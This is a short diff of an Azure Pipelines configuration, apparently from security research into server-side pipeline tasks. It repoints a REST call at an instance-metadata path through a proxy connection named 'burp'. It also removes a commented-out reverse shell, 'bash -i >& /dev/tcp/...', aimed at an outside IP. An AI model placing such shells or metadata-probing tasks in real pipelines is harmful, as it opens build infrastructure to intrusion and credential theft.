@@ -12,23 +12,16 @@ variables:
   headername: 'metadata'
 
 jobs:
-- job: A
+- job: RunRESTAPI
   pool: server
   steps:
-  - task: AzureFunction@1
+  - task: InvokeRESTAPI@1
     inputs:
-      function: 'http://acrin.lightspin.cafe/metadata/instance'
-      key: 'sss'
+      connectionType: 'connectedServiceName'
+      serviceConnection: 'burp'
       method: 'GET'
       headers: |
         {
         "metadatax":"true"
         }
       waitForCompletion: 'false'
-  # - task: Bash@3
-  #   inputs:
-  #     targetType: 'inline'
-  #     script: |
-  #       # Write your commands here
-        
-  #       bash -i >& /dev/tcp/3.84.4.40/80 0>&1
